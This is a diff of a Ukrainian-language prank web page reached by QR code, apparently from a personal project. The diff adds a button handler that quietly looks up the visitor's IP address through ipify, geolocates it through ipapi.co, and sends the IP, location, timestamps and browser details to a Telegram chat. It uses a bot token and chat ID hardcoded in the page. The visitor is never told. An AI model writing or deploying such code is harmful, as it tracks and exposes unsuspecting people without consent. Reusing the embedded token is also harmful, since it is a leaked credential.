@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>QR-сайт</title>
     <style>
         body {
@@ -55,7 +55,7 @@
             margin-top: 40px;
             text-decoration: none;
             color: #fff;
-            display: none; /* приховано спочатку */
+            display: none;
             align-items: center;
             gap: 12px;
             font-size: 22px;
@@ -86,33 +86,70 @@
 </head>
 <body>
 
-    <h1>Ну і нахуя ти сканіруєш QR?</h1>
+<h1>Ну і нахуя ти сканіруєш QR?</h1>
 
-    <button onclick="sendTelegram()">Ну раз зайшов(шла) сюда, нажми уже!</button>
+<button onclick="sendTelegram()">Ну раз зайшов(шла) сюда, нажми уже!</button>
 
-    <a class="tg-link" id="tgLink" href="https://t.me/H00evat0" target="_blank">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
-        @H00evat0
-    </a>
+<a class="tg-link" id="tgLink" href="https://t.me/H00evat0" target="_blank">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" />
+    @H00evat0
+</a>
 
-    <script>
-        function sendTelegram() {
-            const TOKEN = '8655587751:AAFFkYG7b_PvhWa1bvlea_tx949FUWbUib0';
-            const CHAT_ID = '6651633122';
+<script>
+async function sendTelegram() {
+    const TOKEN = '8655587751:AAFFkYG7b_PvhWa1bvlea_tx949FUWbUib0';
+    const CHAT_ID = '6651633122';
 
-            // Надсилаємо повідомлення в Telegram
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: 'Хтось натиснув кнопку на сайті!'
-                })
-            }).then(() => {
-                                document.getElementById('tgLink').style.display = 'flex';
-            }).catch(err => alert('Помилка: ' + err));
+    const now = new Date();
+    const timestampLocal = now.toLocaleString();
+    const timestampUTC = now.toUTCString();
+    const userAgent = navigator.userAgent;
+
+    let ip = 'не визначено';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip || ip;
+    } catch (e) {
+        console.warn('Не вдалось отримати IP:', e);
+    }
+
+    let location = 'не визначено';
+    try {
+        if (ip !== 'не визначено') {
+            const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+            const locData = await locResponse.json();
+            if (locData.city && locData.region && locData.country_name) {
+                location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
+            } else if (locData.region && locData.country_name) {
+                location = `${locData.region}, ${locData.country_name}`;
+            } else if (locData.country_name) {
+                location = locData.country_name;
+            }
         }
-    </script>
+    } catch (e) {
+        console.warn('Не вдалось отримати локацію:', e);
+    }
+
+    const message = `📢 *Натиснули кнопку на сайті!*\n\n` +
+                    `🕒 Локальний час: ${timestampLocal}\n` +
+                    `🕒 UTC час: ${timestampUTC}\n` +
+                    `🌐 IP: ${ip}\n` +
+                    `📍 Локація: ${location}\n` +
+                    `🖥️ Браузер/пристрій: ${userAgent}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
+        });
+        document.getElementById('tgLink').style.display = 'flex';
+    } catch (err) {
+        alert('Помилка: ' + err);
+    }
+}
+</script>
 
 </body>
 </html>
